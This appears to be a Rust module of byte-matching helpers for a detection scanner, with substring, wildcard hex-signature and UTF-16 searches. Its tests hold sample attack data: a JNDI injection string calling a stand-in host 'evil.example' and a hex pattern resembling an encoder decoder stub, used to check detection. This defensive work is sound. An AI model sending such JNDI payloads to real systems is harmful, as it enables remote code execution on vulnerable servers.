//! Byte-level inspection helpers shared by multiple modules.

/// Constant-time-ish substring search. Returns offset on match.
pub fn bytes_contain(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() { return None; }
    'outer: for i in 0..=haystack.len() - needle.len() {
        for j in 0..needle.len() {
            if haystack[i + j] != needle[j] { continue 'outer; }
        }
        return Some(i);
    }
    None
}

/// Hex pattern with '?' wildcard bytes: e.g. "d9 eb 9b d9 74 24 f4 5b 81 73 13 ?? ?? ?? ??".
pub fn hex_signature_match(haystack: &[u8], pattern: &str) -> Option<usize> {
    let mut bytes: Vec<Option<u8>> = Vec::new();
    for tok in pattern.split_ascii_whitespace() {
        if tok == "??" { bytes.push(None); continue; }
        if tok.len() != 2 { return None; }
        let b = u8::from_str_radix(tok, 16).ok()?;
        bytes.push(Some(b));
    }
    if bytes.is_empty() || haystack.len() < bytes.len() { return None; }
    'outer: for i in 0..=haystack.len() - bytes.len() {
        for (j, pb) in bytes.iter().enumerate() {
            if let Some(b) = pb {
                if haystack[i + j] != *b { continue 'outer; }
            }
        }
        return Some(i);
    }
    None
}

/// UTF-16LE substring probe — Windows-friendly for CreateService / LSASS paths.
pub fn utf16_contains(haystack: &[u8], needle: &str) -> bool {
    let u16: Vec<u8> = needle.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    bytes_contain(haystack, &u16).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test] fn finds_jndi() {
        let hay = b"some prefix ${jndi:ldap://evil.example/a} suffix";
        assert!(bytes_contain(hay, b"${jndi:").is_some());
    }
    #[test] fn hex_with_wildcards() {
        let hay = [0xd9u8,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x5b,0x81,0x73,0x13,0xde,0xad,0xbe,0xef];
        assert!(hex_signature_match(&hay,
            "d9 eb 9b d9 74 24 f4 5b 81 73 13 ?? ?? ?? ??").is_some());
    }
    #[test] fn utf16() {
        let needle = "ADMIN$";
        let bytes: Vec<u8> = needle.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(utf16_contains(&bytes, "ADMIN$"));
    }
}
